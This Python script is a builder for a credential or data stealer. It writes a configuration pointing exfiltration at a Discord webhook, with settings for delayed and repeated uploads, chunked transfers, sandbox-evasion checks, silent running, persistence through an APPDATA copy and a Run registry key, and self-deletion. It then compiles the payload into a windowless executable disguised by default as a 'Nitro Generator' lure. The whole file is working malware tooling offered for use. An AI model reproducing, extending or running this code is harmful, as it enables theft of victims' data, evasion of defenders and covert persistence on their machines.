#!/usr/bin/env python3
"""Generate config.py for the stealer and build the lure into an executable.

    python builder.py --webhook "https://discord.com/api/webhooks/..." --build
    python builder.py --webhook "..." --build --nuitka
"""

import argparse
import pathlib
import subprocess
import sys

ROOT = pathlib.Path(__file__).resolve().parent
CONFIG = ROOT / "config.py"

TEMPLATE = '''"""Runtime configuration. Generated by builder.py."""

WEBHOOK = {webhook!r}
APP_NAME = {app_name!r}
DELAY_MINUTES = {delay}
RETRY_MINUTES = {retry}
REPEAT_HOURS = {repeat}
MAX_UPLOAD_MB = {max_mb}
CHUNK_MB = {chunk_mb}
GUARD = {guard}
SILENT = {silent}
PERSIST = {persist}
SELF_DELETE = {self_delete}
'''


def write_config(args):
    CONFIG.write_text(
        TEMPLATE.format(
            webhook=args.webhook,
            app_name=args.name,
            delay=args.delay,
            retry=args.retry,
            repeat=args.repeat,
            max_mb=args.max_mb,
            chunk_mb=args.chunk_mb,
            guard=not args.no_guard,
            silent=args.silent,
            persist=args.persist,
            self_delete=args.self_delete,
        ),
        encoding="utf-8",
    )
    print("config -> %s" % CONFIG)


def build_pyinstaller(name, icon):
    command = [
        sys.executable,
        "-m",
        "PyInstaller",
        "--noconfirm",
        "--onefile",
        "--noconsole",
        "--name",
        name,
        "--hidden-import",
        "Crypto.Cipher.AES",
        "--distpath",
        str(ROOT / "dist"),
        "--workpath",
        str(ROOT / "build"),
        "--specpath",
        str(ROOT / "build"),
    ]
    if icon:
        command += ["--icon", icon]
    command.append(str(ROOT / "main.py"))
    subprocess.run(command, check=True)
    return ROOT / "dist" / (name + ".exe")


def build_nuitka(name, icon):
    command = [
        sys.executable,
        "-m",
        "nuitka",
        "--onefile",
        "--windows-disable-console",
        "--enable-plugin=tk-inter",
        "--assume-yes-for-downloads",
        "--output-filename=%s.exe" % name,
        "--output-dir=%s" % (ROOT / "dist"),
        "--remove-output",
    ]
    if icon:
        command.append("--windows-icon-from-ico=%s" % icon)
    command.append(str(ROOT / "main.py"))
    subprocess.run(command, check=True)
    return ROOT / "dist" / (name + ".exe")


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--webhook", default="")
    parser.add_argument("--name", default="Nitro Generator")
    parser.add_argument("--delay", type=int, default=0, help="minutes before first upload")
    parser.add_argument("--retry", type=int, default=30, help="minutes between upload retries")
    parser.add_argument("--repeat", type=int, default=0, help="hours between repeat collections, 0 = once")
    parser.add_argument("--max-mb", type=int, default=45, help="staging size cap")
    parser.add_argument("--chunk-mb", type=int, default=8, help="split threshold per upload")
    parser.add_argument("--no-guard", action="store_true", help="skip sandbox checks")
    parser.add_argument("--silent", action="store_true", help="no GUI")
    parser.add_argument("--persist", action="store_true", help="copy to APPDATA and set Run key")
    parser.add_argument("--self-delete", action="store_true")
    parser.add_argument("--icon", default="")
    parser.add_argument("--nuitka", action="store_true", help="compile with Nuitka instead of PyInstaller")
    parser.add_argument("--build", action="store_true", help="build the executable (default)")
    parser.add_argument("--config-only", action="store_true")
    args = parser.parse_args()

    if not args.webhook and not args.config_only:
        raise SystemExit("--webhook is required (or pass --config-only)")

    write_config(args)
    if args.config_only:
        return

    if args.nuitka:
        output = build_nuitka(args.name, args.icon)
    else:
        output = build_pyinstaller(args.name, args.icon)
    print("built -> %s" % output)


if __name__ == "__main__":
    main()
